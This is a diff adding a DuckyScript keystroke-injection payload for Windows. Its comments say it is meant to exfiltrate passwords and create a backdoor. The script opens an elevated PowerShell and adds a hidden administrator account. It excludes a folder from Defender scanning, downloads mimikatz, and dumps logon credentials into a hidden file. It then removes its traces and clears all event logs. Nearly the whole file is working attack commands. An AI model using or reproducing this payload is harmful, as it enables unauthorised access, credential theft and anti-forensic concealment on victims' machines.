@@ -1,0 +1,46 @@
+REM this is the script for creating a exfiltrate data including passwords and creating backdoor on a normal windows user having builtin\Admin 
+REM opening powershell as admin
+DELAY 6000
+GUI r
+DELAY 100
+STRING powershell
+CONTROL SHIFT ENTER
+DELAY 200
+LEFT
+ENTER
+DELAY 100
+REM adding a backdoor account and setting that to administrator
+STRING net user Admin Admin /add
+ENTER
+STRING net localgroup BUILTIN\Administrators Admin /add
+ENTER
+REM Adding a path to AV exclusion to download juicy binaries
+STRING Add-MpPreference -ExclusionPath C:\Windows\Tasks
+ENTER
+STRING cd C:\Windows\Tasks
+ENTER
+REM downloading mimikatz and using it to get password hashes
+STRING curl https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip -Outfile m.zip
+ENTER
+DELAY 500
+STRING Expand-Archive -Path m.zip -DestinationPath ./test/
+ENTER
+DELAY 50
+STRING cd test/x64
+ENTER
+STRING .\mimikatz.exe "sekurlsa::logonpasswords" "exit" >> ../../important
+ENTER
+STRING attrib +h ../../important
+ENTER
+REM add stuff here
+
+REM removing footprints and all logs (could give away that system as been hacked, but wont give away the damage)
+STRING cd ../..
+ENTER
+STRING rm ./test/
+ENTER
+STRING A
+ENTER
+STRING Remove-MpPreference -ExclusionPath C:\Windows\Tasks
+ENTER
+STRING Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
